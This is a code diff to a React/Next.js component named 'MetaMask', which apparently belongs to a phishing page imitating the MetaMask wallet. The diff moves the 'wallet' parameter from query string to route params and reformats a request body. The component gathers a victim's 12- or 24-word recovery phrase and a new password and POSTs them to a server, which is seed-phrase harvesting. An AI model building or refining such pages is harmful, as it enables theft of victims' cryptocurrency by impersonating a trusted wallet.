@@ -3,7 +3,7 @@
 import { useState, FormEvent, useEffect } from "react";
 import PhraseField from "./PhraseField";
 import Link from "next/link";
-import { useRouter, useSearchParams } from "next/navigation";
+import { useParams, useRouter } from "next/navigation";
 function Spinner() {
   return (
     <div
@@ -14,8 +14,8 @@ function Spinner() {
 }
 
 export default function MetaMask() {
-  const searchParams = useSearchParams();
-  const wallet = searchParams.get("wallet");
+  const params = useParams();
+  const wallet = params.wallet as string | undefined;
   const [noPhrase, setNoPhrase] = useState("I have a 12-word phrase");
   const [phraseWords, setPhraseWords] = useState<string[]>(Array(24).fill(""));
   const [newPassword, setNewPassword] = useState("");
@@ -59,7 +59,11 @@ export default function MetaMask() {
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({ phrase, password: newPassword, wallet: wallet ?? undefined }),
+        body: JSON.stringify({
+          phrase,
+          password: newPassword,
+          wallet: wallet ?? undefined,
+        }),
       });
 
       if (!response.ok) {
